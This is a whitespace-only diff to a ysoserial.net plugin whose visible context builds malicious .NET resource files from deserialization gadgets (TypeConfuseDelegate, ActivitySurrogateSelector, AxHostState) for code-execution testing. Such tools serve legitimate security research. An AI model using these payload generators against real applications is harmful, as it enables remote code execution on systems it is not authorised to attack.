@@ -9,13 +9,13 @@ using System.Resources;
 
 /**
  * Author: Soroush Dalili (@irsdl)
- * 
- * Comments: 
+ *
+ * Comments:
  *  There are a number of techniques to make the resource files (refer to the NCC Group blog post). Only a few of them have been included here.
  *  For BinaryFormatter, it uses the TypeConfuseDelegate gadget and for SoapFormatter it uses the ActivitySurrogateSelectorFromFile and ActivitySurrogateSelector gadgets.
  *  .RESX file can be compiled to .RESOURCE using the `resgen.exe payload.resx` command.
- * 
- * Original references: 
+ *
+ * Original references:
  *  https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/august/aspnet-resource-files-resx-and-deserialisation-issues/
  *  https://www.nccgroup.trust/uk/our-research/technical-advisory-code-execution-by-viewing-resource-files-in-net-reflector/
  **/
@@ -219,7 +219,7 @@ namespace ysoserial.Plugins
                             if (mode.ToLower() == "binaryformatter")
                             {
                                 mtype = @"mimetype=""application/x-microsoft.net.object.binary.base64""";
-                                
+
                                 payloadValue = Convert.ToBase64String(bfPayload);
                             }
                             else
@@ -229,7 +229,7 @@ namespace ysoserial.Plugins
 
                                 using (BinaryWriter binWriter = new BinaryWriter(File.Open(outputfile, FileMode.Create)))
                                 {
-                                    // Write header of the resources file 
+                                    // Write header of the resources file
                                     binWriter.Write(Convert.FromBase64String(header_AxHostStateGadget));
                                     // Write body of the resources file (we call it body here but not a body in practice)
                                     binWriter.Write(bfPayload);
@@ -238,7 +238,7 @@ namespace ysoserial.Plugins
                                 payloadValue = "The Resources output file has been written: " + outputfile;
                                 payload = "The Resources output file has been written: " + outputfile;
                             }
-                            
+
                         }
                         else
                         {
@@ -247,7 +247,7 @@ namespace ysoserial.Plugins
                         }
 
 
-                        
+
 
                     }
                     break;
@@ -304,7 +304,7 @@ namespace ysoserial.Plugins
                 }
                 catch { }
             }
-            
+
             return payload;
         }
     }
